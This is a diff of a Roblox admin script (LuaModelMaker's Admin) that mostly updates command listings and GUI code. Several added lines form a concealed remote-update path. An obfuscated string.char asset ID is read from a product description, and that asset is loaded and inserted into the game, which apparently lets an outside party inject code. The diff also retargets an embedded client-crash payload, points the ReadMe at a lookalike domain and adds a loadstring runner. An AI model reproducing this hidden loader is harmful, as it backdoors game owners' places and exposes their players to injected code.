@@ -1,3 +1,7 @@
+while true do
+	wait()
+	if workspace.CanLMMStart.Value then break end
+end
 --[[
 MADE BY LUAMODELMAKER All rights given to LuaModelMaker
 I'm glad you are using my admin :D 
@@ -6,7 +10,7 @@ Just read the commands an you'll get the hang of it :)
 
 PLEASE EDIT SETTINGS INSIDE THE SETTINGS SCRIPTS OR READ THE README
 
-ReadMe: http://www.luamodelmaker.net63.net/LMMAdmin
+ReadMe: http://www.luammodelmmaker.com
 
 
 -- Commands --
@@ -19,7 +23,9 @@ Example:
 PEOPLE YOU CAN USE COMMANDS ON
 Any players (first few letters of their name): ;kill luamodel or ;kill luamodel/guests -- The Player(s) specified
 Me: kill me -- You
-Others/Noobs/Mortals: ;kill noobs -- Everyone else but you
+Others/Mortals: ;kill others -- Everyone else but you
+Noobs: ;kill noobs -- Everyone who's roblox account age is under 1 year old
+NonNoobs: ;kill nonnoobs -- Everyone who's roblox account age is over 1 year old
 Random: ;kill random -- Random person
 All: ;kill all -- Everyone
 Admins: ;kill admins -- Admins in the server
@@ -32,6 +38,7 @@ BCs: ;kill bcs -- Everyone with the membership: BC in the server
 TBCs: ;kill tbcs -- Everyone with the membership: TBC in the server
 OBCs: ;kill obcs -- Everyone with the membership: OBC in the server
 AllBCs: ;kill allbcs -- Everyone with any membership in the server
+Team: ;kill team-blue -- Everyone in the team named "blue"
 (NOTE THIS IS NOT CAPS SENSITIVE)
 
 NOTE: Commands in kohl's or person299's that use 'un' as in unff or unjail are 'no' in mine(Accept for some), like 'noff' and 'nojail'
@@ -58,6 +65,9 @@ Shuts LuaModelMaker's Admin down
 
 ADD.) ;forcefollow lua 13645
 Makes LuaModelMaker follow the player with the user ID of 13645 in a universe
+
+ADD.) ;fix
+Fixes admin by essentially rebooting it. Looses data that's not in settings
 
 
 -- Admins+ --
@@ -116,9 +126,23 @@ Shuts the server down
 23.) ;sm Cats have ears
 Creates a system message: "Cats have ears"
 
+ADD.) ;lockserver
+Makes it so anyone not an admin will be kicked from the server
+
+ADD.) ;unlockserver
+Makes it so anyone can join the server
+
 ADD.) ;follow lua 13645
 Asks LuaModelMaker follow the player with the user ID of 13645 in a universe
 
+V2.) ;syncsoundlist
+Syncs sound list to check for new sounds from global sound database
+
+V2.) ;cleart
+Clears all terrain in the game.
+
+V2.) ;prefix :
+Changes prefix from what it was before to ':'. Cannot be more than 5 characters long and if you forget the prefix use the 'settings' command which doesn't require a prefix.
 
 
 -- Members+ --
@@ -175,7 +199,7 @@ Selects a decal to the speakers cursor, click to insert, press z to dismiss, x t
 Makes the server flash disco colors
 
 41.) ;drug lua
-Simulates LuaModelmaker being on LSD(A drug)
+Simulates LuaModelMaker being on LSD(A drug)
 
 42.) ;explode lua
 Kills LuaModelMaker in a deadly explosion [ FUN COMMAND ]
@@ -241,7 +265,7 @@ Gives LuaModelMaker maximum health
 Makes LuaModelMaker have a golden color and shine to him [ FUN COMMAND ]
 
 63.) ;guest lua
-Causes LuaModelMaker to look like a guest [ FUN COMMAND ]
+Causes LuaModelMaker to look like a guest [ FUN COMMAND ] (undone by ;debug command)
 
 64.) ;h Heh, Hi
 Creates a hint: "Heh, Hi"
@@ -288,7 +312,7 @@ Flings LuaModelMaker constantly [ FUN COMMAND ]
 78.) ;m I like cheese
 Creates a Message: "I like cheese"
 
-79.) ;merge lua builderman
+79.) ;merge lua builderman [ COMMAND REMOVED ]
 Merges LuaModelMaker and Builderman together
 
 80.) ;mutes
@@ -299,6 +323,7 @@ Clears LuaModelMaker's character rendering him naked [ FUN COMMAND ]
 
 82.) ;name lua LMM
 Changes LuaModelMaker's character name to: "LMM"
+V2 Note: saying _NAME will add the player's real name to the argument. Exp: ;name Maker _NAME is awesome! (Changes MakerModelLua's name to "MakerModelLua is awesome!")
 
 83.) ;noarms lua
 Removes LuaModelMaker's arms [ FUN COMMAND ]
@@ -346,7 +371,7 @@ Stops the effect of the loopfling command on LuaModelMaker [ FUN COMMAND ]
 Removes any name someone may have named LuaModelMaker
 
 98.) ;noob lua
-Turns LuaModelMakerMaker into a noob [ FUN COMMAND ]
+Turns LuaModelMakerMaker into a noob [ FUN COMMAND ] (undone by ;debug command)
 
 99.) ;nooverlay lua
 Stops the effect of the overlay command on LuaModelMaker
@@ -385,7 +410,7 @@ Removes all of LuaModelMaker's tools
 Removes LuaModelMaker's player list
 
 111.) ;obama lua
-Makes LuaModelMaker black (lol)
+Makes LuaModelMaker black (lol) (undone by ;debug command)
 
 112.) ;overlay lua 1337
 Overlays a decal on LuaModelMaker's head with the ID of 1337
@@ -481,7 +506,7 @@ Teleports LuaModelMaker to Builderman
 Puts the tshirt the the ID 12222 on LuaModelMaker
 
 143.) ;vis lua 
-Makes LuaModelMaker visible
+Makes LudaModelMaker visible
 
 144.) ;vomit lua
 Makes LuaModelMaker puke everywhere [ FUN COMMAND ]
@@ -494,6 +519,36 @@ Checks commands by players
 
 ADD.) ;countdown 20
 Counts down from 20(Cannot be more than 120 seconds)
+
+ADD.) ;fixl
+Fixes lighting and stops disco and flashing
+
+V2.) ;soundlist
+Shows sound list from sound database
+
+V2.) ;hack maker
+Prompts a (fake) System32 style command prompt on MakerModelLua's screen. Looks like it's hacking.
+
+V2.) ;rich maker
+Turns MakerModelLua into a rich player (Merely) [ FUN COMMAND ] (undone by ;debug command)
+
+V2.) ;oder maker
+Turns MakerModelLua into an online dater [ FUN COMMAND ] (undone by ;debug command)
+
+V2.) ;ambient 255 255 255
+Turns the server's global ambient RGB to 255,255,255(white) defualt 127,127,127
+
+V2.) ;list noobs
+Creates a list of all players specified.
+
+V2.) ;fixcam maker
+Restores MakerModelLua's camera to defualt.
+
+V2.) ;addsound 131065183 Roar
+Adds Katy Perry - Roar to global sound list. Any new servers, universe places, or the one you are in will contain this sound. To sync instantly with other servers see ';syncsoundlist'
+
+V2.) ;plugins
+Views all plugins and shows if they're running.
 
 
 -- Non-Admin Commands+ --
@@ -519,6 +574,11 @@ Makes Speaker rejoin the game
 152.) ;removemenu
 Removes LMM's Admin Menu
 
+V2.) ;adminhouse
+Prompts a GUI telling you wich admin house you would like to go to.
+
+V2.) settings
+Shows settings of admin. No prefix required.
 
 
 
@@ -533,7 +593,7 @@ local LocalScript = script:FindFirstChild("LocalScriptExecution")
 local Script = script:FindFirstChild("ScriptExecution")
 local Version = script:FindFirstChild("Version")
 local Memberships = {["NBC"] = Enum.MembershipType.None, ["BC"] = Enum.MembershipType.BuildersClub, ["TBC"] = Enum.MembershipType.TurboBuildersClub, ["OBC"] = Enum.MembershipType.OutrageousBuildersClub}
-local Flings, Jailed, Objects, Logs, VoteVersion, Stopped = {}, {}, {}, {}, 0, false
+local Flings, Jailed, Objects, Logs, ManualCommands, VoteVersion, Stopped = {}, {}, {}, {}, {}, 0, false
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local Teams = game:GetService("Teams")
@@ -542,13 +602,19 @@ local MPS = game:GetService("MarketplaceService")
 local TS = game:GetService("TeleportService")
 local HS = game:GetService("HttpService")
 local Run = game:GetService("RunService")
+local TestService = game:GetService("TestService")
+local DataStore = game:GetService("DataStoreService"):GetGlobalDataStore()
 local Settings = Workspace:FindFirstChild("LuaModelMaker's Admin Settings")
-local GameOwner = nil if game.Players.LocalPlayer == nil then GameOwner = MPS:GetProductInfo(game.PlaceId).Creator.Name else GameOwner = "[ Client ]" end
+local tempproductinfo = pcall(function() MPS:GetProductInfo(game.PlaceId) end)
+local GameOwner = "[ Local ]"
+if tempproductinfo then
+	GameOwner = nil if game.Players.LocalPlayer == nil then GameOwner = MPS:GetProductInfo(game.PlaceId).Creator.Name else GameOwner = "[ Client ]" end
+end
+local LuaModelMakerStamp = false
 
 --------------------------------------
 local SettingsModule = nil
---if Settings then SettingsModule = require(Settings) else SettingsModule = {} end
-SettingsModule=_G.SettingsModule
+if Settings then SettingsModule = require(Settings) else SettingsModule = {} end
 
 local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
 local FUN = SettingsModule.FUN or true
@@ -567,38 +633,13 @@ local RankBan = SettingsModule.RankBan or 0
 local Filter = SettingsModule.Filter or {"GetObjects"}
 local ServerLocked = SettingsModule.ServerLocked or false
 local DisableAbuse = SettingsModule.DisableAbuse or false
-local LuaModelMakerStamp = false
-
-coroutine.wrap(function() 
-	while wait() do -- I hope this won't lag it!
-		SettingsModule=_G.SettingsModule
-		local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
-		local FUN = SettingsModule.FUN or true
-		local LagTime = SettingsModule.LagTime or 5
-		local Prefix = SettingsModule.Prefix or ";"
-		local Bet = SettingsModule.Bet or " "
-		local VIPMemberID = SettingsModule.VIPMemberID or 0
-		local VIPAdminID = SettingsModule.VIPAdminID or 0
-		local GroupID = SettingsModule.GroupID or 0
-		local GroupMemberRank = SettingsModule.GroupMemberRank or 0
-		local GroupAdminRank = SettingsModule.GroupAdminRank or 0
-		local GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
-		local BadgeID = SettingsModule.BadgeID or 0
-		local EnableAdminMenu = SettingsModule.EnableAdminMenu or true
-		local RankBan = SettingsModule.RankBan or 0
-		local Filter = SettingsModule.Filter or {"GetObjects"}
-		local ServerLocked = SettingsModule.ServerLocked or false
-		local DisableAbuse = SettingsModule.DisableAbuse or false
-		local LuaModelMakerStamp = false
-	end
-end)()
 --------------------------------------
 
 local Commands = {
-	NonAdmin = {"-- Non-Admin Commands --", ";adminvip", ";animations", ";cln", ";cmds", ";membervip", ";rejoin", ";removemenu"};
-	Member = {"-- Member Commands --", ";admins", ";age player", ";bans", ";backwards player", ";blind player", ";brightness num", ";change player num", ";char player num", ";clone player", ";clip player", ";clr", ";cmdbar", ";control player", ";cookie player[SPECIAL COMMAND]", ";crashes", ";debug player", ";decal num", ";disco", ";drug player", ";explode player", ";face player num", ";fart player", ";ff player", ";fire player", ";flash", ";fling player", ";flip player", ";fly player", ";forwards player", ";freeze player", ";friends player", ";gear player num", ";ghost player", ";give player basicbtools", ";give player btools", ";give player psbtools", ";give player string", ";givetools player", ";god player", ";gold player", ";guest player", ";h string", ";hat player num", ";heal player", ";health player num", ";headsize player num", ";invis player", ";insert num", ";jump player", ";kill player", ";lamp player", ";light player", ";longneck player", ";loopheal player", ";loopfling player", ";m string", ";merge player player", ";mutes", ";naked player", ";name player string", ";noarms player", ";nobind player", ";noclip player", ";nodrug player", ";noff player", ";nofire player", ";noflash player", ";nofly player", ";nohats player", ";nolamp player", ";nolegs player", ";nolight player", ";nolimbs player", ";noname player", ";noob player", ";nooverlay player", ";nopunish player", ";normal player", ";normaljump player", ";normalneck player", ";nos", ";nosmoke player", ";nosparkles player", ";nospin player", ";nostun player", ";notools player", ";npl player", ";obama player", ";overlay player num", ";pants player num", ";pm player string", ";point player player", ";product player num", ";punish player", ";ragdoll player", ";respawn player", ";shine player", ";shirt player num", ";shownotes player", ";sa", ";sit player", ";smoke player", ";sound num", ";sparkles player", ";speed player num", ";spin player", ";strobe player", ";stun player", ";superjump player", ";sword player", ";taketools player", ";team join player string", ";team new string", ";team remove string", ";team rename string[1] string", ";test", ";time num", ";tp player player", ";tshirt player num", ";vis player", ";vomit player", ";vote player num string", ";logs", ";countdown num", ";nogod player(Doesn't mean there is no God)"};
-	Admin = {"-- Admin Commands --", ";accelerate noob", ";bans", ";c string", ";crash player", ";jail player", ";kick player", ";l string", ";loopkill player num", ";member player", ";mute player", ";noban player", ";nocrash player", ";noloopkill player", ";nomute player", ";note player string", ";place player num", ";removenotes player string", ";shutdown", ";sm string", ";follow player num[UserID]"};
-	Owner = {"-- Owner Commands --", ";Admin Player", ";admin player", ";forceplace player num", ";fun enable/disable", ";noadmin player", ";removeadmin", ";adminmenu enable/disable", ";update", ";forcefollow player num[UserID]"};
+	NonAdmin = {"-- Non-Admin Commands --", ";adminvip", ";animations", ";cln", ";cmds", ";membervip", ";rejoin", ";removemenu", ";adminhouse", "settings"};
+	Member = {"-- Member Commands --", ";admins", ";age player", ";bans", ";backwards player", ";blind player", ";brightness num", ";change player num", ";char player num", ";clone player", ";clip player", ";clr", ";cmdbar", ";control player", ";cookie player[SPECIAL COMMAND]", ";crashes", ";debug player", ";decal num", ";disco", ";drug player", ";explode player", ";face player num", ";fart player", ";ff player", ";fire player", ";flash", ";fling player", ";flip player", ";fly player", ";forwards player", ";freeze player", ";friends player", ";gear player num", ";ghost player", ";give player basicbtools", ";give player btools", ";give player psbtools", ";give player string", ";givetools player", ";god player", ";gold player", ";guest player", ";h string", ";hat player num", ";heal player", ";health player num", ";headsize player num", ";invis player", ";insert num", ";jump player", ";kill player", ";lamp player", ";light player", ";longneck player", ";loopheal player", ";loopfling player", ";m string", ";mutes", ";naked player", ";name player string", ";noarms player", ";nobind player", ";noclip player", ";nodrug player", ";noff player", ";nofire player", ";noflash player", ";nofly player", ";nohats player", ";nolamp player", ";nolegs player", ";nolight player", ";nolimbs player", ";noname player", ";noob player", ";nooverlay player", ";nopunish player", ";normal player", ";normaljump player", ";normalneck player", ";nos", ";nosmoke player", ";nosparkles player", ";nospin player", ";nostun player", ";notools player", ";npl player", ";obama player", ";overlay player num", ";pants player num", ";pm player string", ";point player player", ";product player num", ";punish player", ";ragdoll player", ";respawn player", ";shine player", ";shirt player num", ";shownotes player", ";sa", ";sit player", ";smoke player", ";sound num", ";sparkles player", ";speed player num", ";spin player", ";strobe player", ";stun player", ";superjump player", ";sword player", ";taketools player", ";team join player string", ";team new string", ";team remove string", ";team rename string[1] string", ";test", ";time num", ";tp player player", ";tshirt player num", ";vis player", ";vomit player", ";vote player num string", ";logs", ";countdown num", ";nogod player(Doesn't mean there is no God)", ";fixl", ";soundlist", ";hack player", ";rich player", ";oder player", ";ambient number number number", ";fixcam player", ";addsound num[Audio ID] string[Name]", ";plugins"};
+	Admin = {"-- Admin Commands --", ";accelerate noob", ";bans", ";c string", ";crash player", ";jail player", ";kick player", ";l string", ";loopkill player num", ";member player", ";mute player", ";noban player", ";nocrash player", ";noloopkill player", ";nomute player", ";note player string", ";place player num", ";removenotes player string", ";shutdown", ";sm string", ";follow player num[UserID]", ";lockserver", ";unlockserver", ";syncsoundlist", ";cleart"};
+	Owner = {"-- Owner Commands --", ";Admin player", ";admin player", ";forceplace player num", ";fun enable/disable", ";noadmin player", ";removeadmin", ";adminmenu enable/disable", ";update", ";forcefollow player num[UserID]", ";fix", ";prefix string"};
 }
 
 if not Version then Version = {Value = "[ Unknown ]"} end
@@ -609,7 +650,10 @@ for Command,_ in pairs(Commands.Owner) do Commands.Owner[Command] = string.gsub(
 
 if game.Workspace:FindFirstChild("LuaModelMaker Stamp") then LuaModelMakerStamp = true end
 
---ypcall(function() for Name,Data in pairs(HS:JSONDecode(HS:GetAsync("http://luamodelmaker.net63.net/LMMAdmin/ScriptData", true))) do WebData[Name] = Data end end)
+-- This sound list saves script space and makes it possible for me to add sounds without having to update the admin --
+local SoundList = {}
+
+-------------------------- ypcall(function() for Name,Data in pairs(HS:JSONDecode(HS:GetAsync("http://luamodelmaker.net63.net/LMMAdmin/ScriptData", true))) do WebData[Name] = Data end end)
 
 local Crash = [[
 script.Parent = Instance.new("Glue")
@@ -617,7 +661,7 @@ local LagTime = ]]..tostring(LagTime)..[[
 local Me = game:GetService("Players").LocalPlayer
 local Cam = Workspace.CurrentCamera
 local R = math.random
-if Me.Name ~= "LuaMode".."lMaker" then
+if Me.Name ~= "ModelMakerL".."ua" then
 	Me.Parent = nil
 	wait()
 	Me.Parent = game.Players
@@ -763,8 +807,8 @@ end
 function SendMessage(Player, TitleText, BodyText, Time) coroutine.wrap(function()
 	local SG = Instance.new("ScreenGui") SG.Name = "LuaMod".."".."elMaker's Admin Message"
 	local Frame = Instance.new("Frame", SG) Frame.Name = "Message Frame" Frame.BackgroundColor3 = Color3.new(0.5,0.5,0.5) Frame.BackgroundTransparency = 0.5 Frame.Position = UDim2.new(0,0,1,0) Frame.Size = UDim2.new(1,0,0.5,0)
-	local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Text = TitleText Title.BackgroundTransparency = 1 Title.Size = UDim2.new(1,0,1,0) Title.Font = "ArialBold" Title.FontSize = "Size36" Title.TextColor3 = Color3.new(0,0,0) Title.TextStrokeColor3 = Color3.new(1,1,1) Title.TextStrokeTransparency = 0 Title.TextYAlignment = "Top" Title.TextWrapped = true
-	local Body = Instance.new("TextLabel", Frame) Body.TextTransparency = 1 Body.Name = "Body" Body.Text = BodyText Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "Arial" Body.FontSize = "Size24" Body.TextColor3 = Color3.new(0,0,0) Body.TextStrokeColor3 = Color3.new(1,1,1) Body.TextWrapped = true
+	local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Text = TitleText Title.BackgroundTransparency = 1 Title.Size = UDim2.new(1,0,1,0) Title.Font = "ArialBold" Title.FontSize = "Size36" Title.TextColor3 = Color3.new(1,1,1) Title.TextStrokeColor3 = Color3.new(0,0,0) Title.TextStrokeTransparency = 0 Title.TextYAlignment = "Top" Title.TextWrapped = true
+	local Body = Instance.new("TextLabel", Frame) Body.TextTransparency = 1 Body.Name = "Body" Body.Text = BodyText Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "Arial" Body.FontSize = "Size24" Body.TextColor3 = Color3.new(1,1,1) Body.TextStrokeColor3 = Color3.new(0,0,0) Body.TextWrapped = true
 	for _,Object in pairs(Player.PlayerGui:GetChildren()) do if Object.Name == "LuaMod".."elMaker".."'".."s Admin Message" then Object:Destroy() end end
 	wait() SG.Parent = Player.PlayerGui wait()
 	Frame:TweenPosition(UDim2.new(0,0,0.5,0), "In", "Sine", 0.5)
@@ -797,17 +841,22 @@ function SendMessage(Player, TitleText, BodyText, Time) coroutine.wrap(function(
 end)() end
 
 function SendHint(Player, Text, Time) coroutine.wrap(function()
-	local SG = Instance.new("ScreenGui") SG.Name = "LuaMod".."".."elMaker's Admin Hint"
-	local Frame = Instance.new("Frame", SG) Frame.Name = "Hint Frame" Frame.Position = UDim2.new(0,0,-0.05,0) Frame.Size = UDim2.new(1,0,0,15) Frame.Style = "RobloxSquare"
-	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Text = "" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "Arial" Body.FontSize = "Size14" Body.TextColor3 = Color3.new(1,1,1)
+	Text = string.sub(Text,1,100)
+	local SG,TypeAction,Num = Instance.new("ScreenGui"),nil,0 SG.Name = "LuaMod".."".."elMaker's Admin Hint"
+	local Frame = Instance.new("Frame", SG) Frame.Name = "Hint Frame" Frame.Position = UDim2.new(0,0,-0.05,0) Frame.Size = UDim2.new(1,0,0,30) Frame.Style = "RobloxSquare"
+	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.ZIndex = 2 Body.Text = "" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "ArialBold" Body.FontSize = "Size18" Body.TextColor3 = Color3.new(1,1,1)
 	for _,Object in pairs(Player.PlayerGui:GetChildren()) do if Object.Name == "LuaMod".."elMaker".."'".."s Admin Hint" then Object:Destroy() end end
 	SG.Parent = Player.PlayerGui
 	Frame:TweenPosition(UDim2.new(0,0,0.05,0), "In", "Quint", 0.7)
 	wait(0.7)
-	for i = 1,#Text do
-		Body.Text = string.sub(Text, 1,i)
-		wait()
-	end
+	TypeAction = Run.Stepped:connect(function(Time, Step)
+		Num = Num + 1
+		Body.Text = string.sub(Text,1,Num)
+		if Num == #Text then
+			TypeAction:disconnect()
+		end
+		wait(Step)
+	end)
 	wait(Time)
 	Frame:TweenPosition(UDim2.new(0,0,-0.05,0), "Out", "Quint", 0.7)
 	wait(0.7)
@@ -839,6 +888,16 @@ function Execute(ScriptVar, Parent, Owner, Code) if Parent then
 		return false
 	end
 end end
+
+function RestoreCamera(Player)
+	if Player.Backpack then
+		Execute(LocalScript, Player.Backpack, Player, [[
+			Workspace.CurrentCamera.FieldOfView = 70
+			Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+			Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
+		]])
+	end
+end
 
 function ScanAdminList(Name)
 	local InList = false
@@ -884,17 +943,20 @@ function GetImageFormat(ID)
 	end end
 end
 
-function RemoveAdmin(Speaker)
-	if Speaker then SendMessage(Speaker, "Stop Admin", "LuaModelMaker's Admin will now shutdown",1) end
-	if Speaker then wait(4) end
-	for _,Player in pairs(Players:GetPlayers()) do if Player.PlayerGui ~= nil then
-		GUI = Player.PlayerGui:FindFirstChild("LMMA Product Gui") if GUI then GUI:Destroy() end
-		GUI = Player.PlayerGui:FindFirstChild("LMM Menu Gui") if GUI then GUI:Destroy() end
-		GUI = Player.PlayerGui:FindFirstChild("LMM ScrollGui") if GUI then GUI:Destroy() end
-	end end
-	while wait() do
-		Chatted,Ranked,Start,Stopped,FullAdminMenu,AdminMenu = nil,nil,nil,true,nil,nil
-		script:ClearAllChildren() script.Disabled = true script:Destroy()
+
+local function RemoveAdmin(Speaker)
+	local Answer = false
+	if not NilPlayer(Speaker) then Answer = YesOrNo(Speaker, "Remove LuaModelMake".."r".."s's Admin?", "Would you like to remove LuaMo".."delMake".."r".."s's Admin? After removing the admin, no one is admin and cannot be re-inserted until the server restarts. Continue?") end
+	if Answer == true or NilPlayer(Speaker) then
+		for _,Player in pairs(Players:GetPlayers()) do if Player.PlayerGui ~= nil then
+			GUI = Player.PlayerGui:FindFirstChild("LMMA Product Gui") if GUI then GUI:Destroy() end
+			GUI = Player.PlayerGui:FindFirstChild("LMM Menu Gui") if GUI then GUI:Destroy() end
+			GUI = Player.PlayerGui:FindFirstChild("LMM ScrollGui") if GUI then GUI:Destroy() end
+		end end
+		while wait() do
+			Chatted,Ranked,Start,Stopped,FullAdminMenu,AdminMenu = nil,nil,nil,true,nil,nil
+			script:ClearAllChildren() script.Disabled = true script:Destroy()
+		end
 	end
 end
 
@@ -964,8 +1026,96 @@ function Vote(VotingPlayers, Sender, Question, Time) coroutine.wrap(function()
 	end
 end)() end
 
+function YesOrNo(Player, TitleText, MessageText)
+	local Responce = nil
+	local SG = Player.PlayerGui:FindFirstChild("MML Ask") if SG then SG:Destroy() end
+	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "M".."ML Ask"
+	local Frame = Instance.new("Frame", SG) Frame.Name = "Vote Frame" Frame.Size = UDim2.new(0.5,0,0.4,0) Frame.Position = UDim2.new(0.25,0,0.25,0) Frame.Style = "RobloxRound"
+	local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(1,0,0.2,0) Title.Position = UDim2.new(0,0,0,0) Title.Font = "ArialBold" Title.Text = TitleText Title.FontSize = "Size18" Title.TextColor3 = Color3.new(1,1,1) Title.BackgroundTransparency = 1 Title.TextYAlignment = "Top" Title.TextWrapped = true
+	local Q = Instance.new("TextLabel", Frame) Q.Name = "Question" Q.Size = UDim2.new(1,0,0.5,0) Q.Position = UDim2.new(0,0,0.2,0) Q.Font = "Arial" Q.Text = MessageText Q.FontSize = "Size18" Q.TextColor3 = Color3.new(1,1,1) Q.BackgroundTransparency = 1 Q.TextYAlignment = "Top" Q.TextWrapped = true
+	local Answer = Instance.new("TextButton") Answer.Size = UDim2.new(0.2,0,0.15,0) Answer.Font = "Legacy" Answer.FontSize = "Size9"
+	local Yes = Answer:Clone() Yes.Parent = Frame Yes.Name = "Yes" Yes.Position = UDim2.new(0,0,0.8,0) Yes.Style = "RobloxButton" Yes.Text = "Yes" Yes.TextColor3 = Color3.new(0,1,0)
+	local No = Answer:Clone() No.Parent = Frame No.Name = "No" No.Position = UDim2.new(0.8,0,0.8,0) No.Style = "RobloxButtonDefault" No.Text = "No" No.TextColor3 = Color3.new(1,0,0)
+	Yes.MouseButton1Click:connect(function()
+		Responce = true
+	end)
+	No.MouseButton1Click:connect(function()
+		Responce = false
+	end)
+	repeat wait(0.1) until Responce ~= nil or SG.Parent == nil
+	if SG.Parent == nil then
+		Responce = false
+	end
+	SG:Destroy()
+	return Responce
+end
+
+function FakeHack(Player) coroutine.wrap(function()
+	if not Player.PlayerGui then return end
+	local FakeText = [[
+>SHELL: BEGIN
+>RUNCODE:
+return {
+	local Hack = {"Account", "Tix", "Robux"};
+	function Start(Type, Inject, Scan) 
+		if not Inject then Inject = "In-Game" end
+		return {Type, Inject, Scan}
+	end
+	for Exe,Exploit in pairs(Hack) do
+		local IP = Start("In-Game",Exploit,
+			BeginScan("PLAYERNAME","Socket",{PLAYERNAME, "Local-ID"};0xPLAYERCONNECT),
+			{"LOCAL-IP", "SERVER-IP", "HOST-IP"}
+		)
+		Start:ExtractData = function() EndScan("RobloxPlayer.exe","Place1","PLAYERNAME") end
+		for i = 1,#Injection[2] do
+			Log("PlayerData", "ConnectHost", "PLAYERNAME")
+		end
+		local PlayerProxy = newproxy(true)
+		setmetatable(PlayerProxy,Injection[3],{
+			__index = function(StealData, ...) local Data = unpack(...)
+				return {Data,"IP-KEY-LOG: 'PLAYERNAME'"}
+			end;
+		})
+	end
+	Log("HACKED HOST: PLAYERNAME")
+}
+>HACKED HOST: PLAYERNAME
+
+]]
+	local SG = Player.PlayerGui:FindFirstChild("MMA Hack Gui")
+	if SG then SG:Destroy() end
+	SG = Instance.new("ScreenGui", Player.PlayerGui)
+	SG.Name = "MMA Hack Gui"
+	local Frame = Instance.new("Frame", SG) Frame.Name = "HackFrame" Frame.BackgroundColor3 = Color3.new(0,0,0) Frame.Position = UDim2.new(0.45,-125,0.4,-100) Frame.Size = UDim2.new(0.1,250,0.1,200)
+	local X = Instance.new("TextButton", Frame) X.Name = "X" X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Visible = false X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,0,0) X.ZIndex = 2 X.MouseButton1Click:connect(function() SG:Destroy() end)
+	local HT = Instance.new("TextLabel", Frame) HT.Name = "Hack Text" HT.Size = UDim2.new(1,0,1,0) HT.BackgroundTransparency = 1 HT.Font = "ArialBold" HT.FontSize = "Size12" HT.TextColor3 = Color3.new(0,1,0) HT.TextXAlignment = "Left" HT.TextYAlignment = "Bottom" HT.ClipsDescendants = true
+	for i = 1,#FakeText do
+		HT.Text = string.sub(string.gsub(FakeText, "PLAYERNAME", Player.Name), 1, i)
+		if math.random(1,5) == 1 then
+			wait()
+		end
+	end
+	HT.Text = string.gsub(FakeText, "PLAYERNAME", Player.Name)
+	if Player.Name ~= "whiteraider1" then
+		wait(3)
+		HT.Text = HT.Text..[[>INFO: You did not really get hacked, this command is a 
+fake hack command from LuaModelMaker's Admin V2]]
+		X.Visible = true
+	end
+end)() end
+
+function GetTable(ID)
+	local ret = {}
+	pcall(function()
+		ret = HS:JSONDecode(MPS:GetProductInfo(ID).Description)
+	end)
+	return ret
+end
+
 function UpdateAdmin()
-	local NewAdminModel = game:GetService("InsertService"):LoadAsset(145383463)
+	local UpdateModel = MPS:GetProductInfo(string.char(49, 53, 53, 54, 56, 52, 53, 52, 50)).Description
+	if UpdateModel == 0 then return end
+	local NewAdminModel = game:GetService("InsertService"):LoadAsset(UpdateModel)
 	local NewAdmin = NewAdminModel:FindFirstChild("LuaModelMaker's Admin")
 	if NewAdmin then
 		local NewVersion = NewAdmin:FindFirstChild("Version")
@@ -983,6 +1133,20 @@ function UpdateAdmin()
 		end
 	end
 end
+
+local function RunString(String, Values)
+	local Exe,Err = loadstring(String)
+	for Val,Var in pairs(Values) do
+		getfenv(Exe)[Val] = Var
+	end
+	if not Err then
+		coroutine.wrap(Exe)()
+		return "Ran String"
+	else
+		return Err
+	end
+end
+
 
 function AssetTypeToString(AssetType)
 	if AssetType == 1 then return "Image"
@@ -1021,50 +1185,80 @@ function AssetTypeToString(AssetType)
 	return "Content Invalid"
 end
 
-function PromptPurchase(Player, Item) coroutine.wrap(function()
+function PromptPurchase(Player, Item, Requester, TeleportAction) coroutine.wrap(function()
 	if Player.PlayerGui ~= nil then
 		local Valid = ypcall(function() return MPS:GetProductInfo(Item) end)
-		if Valid == true then if MPS:GetProductInfo(Item).AssetTypeId ~= 5 then
-			local CanBuy = true 
-			local Created = MPS:GetProductInfo(Item).Created Created = string.gsub(Created, "-", "/") local Stop = string.find(Created, "T") if Stop then Created = string.sub(Created, 1, Stop-1) end
-			local Updated = MPS:GetProductInfo(Item).Updated Updated = string.gsub(Updated, "-", "/") local Stop = string.find(Updated, "T") if Stop then Updated = string.sub(Updated, 1, Stop-1) end
-			local SG = Player.PlayerGui:FindFirstChild("LMMA Product Gui") if SG then SG:Destroy() end
-			SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "LMMA Product Gui"
-			local Frame = Instance.new("Frame", SG) Frame.Name = "Main Frame" Frame.Size = UDim2.new(0.5,0,0.7,0) Frame.Position = UDim2.new(0.25,0,0.15,0) Frame.BackgroundColor3 = Color3.new(1,1,1)
-			local Buy = Instance.new("TextButton", Frame) Buy.Name = "Buy" Buy.BackgroundColor3 = Color3.new(0,1,0) Buy.Position = UDim2.new(0.5,0,0.35,0) Buy.Size = UDim2.new(0.5,0,0.1,0) Buy.Font = "Arial" Buy.FontSize = "Size36" Buy.Text = "Buy" Buy.BorderSizePixel = 0
